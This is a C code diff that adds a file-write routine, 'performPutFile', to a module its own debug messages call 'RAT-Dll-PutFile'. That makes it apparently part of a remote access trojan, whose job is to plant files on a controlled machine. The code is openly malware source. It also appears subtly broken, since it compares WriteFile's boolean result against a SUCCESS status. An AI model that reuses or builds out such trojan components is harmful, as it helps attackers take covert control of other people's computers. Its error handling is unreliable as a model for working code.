@@ -16,10 +16,53 @@ return:
 INT performPutFile(__in const char* filePath, __in const char* fileBytes, __in bool overwrite)
 {
 	INT status = SUCCESS;
+	DWORD bytesWritten = 0, bytesToWrite = strlen(fileBytes);
+	CHAR msgBuf[DEFAULT_BUF_LEN];
 	HANDLE hFile;
 
-	
+	if (overwrite)
+	{
+		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Overwriting existing file!\n");
 
+		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile == INVALID_HANDLE_VALUE)
+		{
+			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
+			status = FAILURE;
+			goto cleanup;
+		}
+	}
+
+	else
+	{
+		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Attempting to create new file...\n");
+
+		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hFile == INVALID_HANDLE_VALUE)
+		{
+			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
+			status = FAILURE;
+			goto cleanup;
+		}
+	}
+
+	status = WriteFile(hFile, fileBytes, bytesToWrite, &bytesWritten, NULL);
+	if (status != SUCCESS)
+	{
+		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from WriteFile!\n");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+	if (bytesWritten != bytesToWrite)
+	{
+		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failed to write total byte buffer!\n");
+		status = FAILURE;
+		goto cleanup;
+	}
+
+
+	sprintf_s(msgBuf, "RAT-Dll-PutFile::performPutFile - Wrote %i bytes to %s !\n", bytesWritten, filePath);
 
 
 cleanup:
